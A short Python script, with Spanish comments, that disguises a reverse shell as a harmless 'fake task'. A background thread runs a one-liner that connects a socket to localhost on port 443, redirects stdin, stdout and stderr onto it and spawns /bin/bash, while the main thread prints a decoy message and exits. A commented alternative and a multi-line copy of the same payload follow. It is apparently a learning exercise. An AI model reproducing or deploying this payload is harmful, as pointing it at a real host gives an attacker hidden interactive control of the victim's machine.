#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from threading import Thread
from time import sleep
from subprocess import run
import os


def task():
    run(["python3", "-c", "import pty, socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"localhost\", 443)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn(\"/bin/bash\");"], capture_output=False)
    #os.system("python3 -c \"import pty, socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 443)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn('/bin/bash');\"")


if __name__ == "__main__":
    try:
        Thread(target=task).start()
        print("\nAquí hacemos nuestra 'task' falsa.")
        sleep(5)
        print("Saliendo.")
        os._exit(0)
    except KeyboardInterrupt:
        print("Saliendo con interrupción.")
        os._exit(0)

'''
payload en múltiples líneas

from pty import spawn
from socket import socket, AF_INET, SOCK_STREAM
import os

s = socket(AF_INET, SOCK_STREAM)
# nos conectamos al servidor por el puerto 443, en este caso nostros mismos
s.connect(("localhost", 443))
# duplicamos los descriptores de fichero para abrir una shell
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
# ejecutamos la TCP-ReverseShell
spawn("/bin/bash")
'''
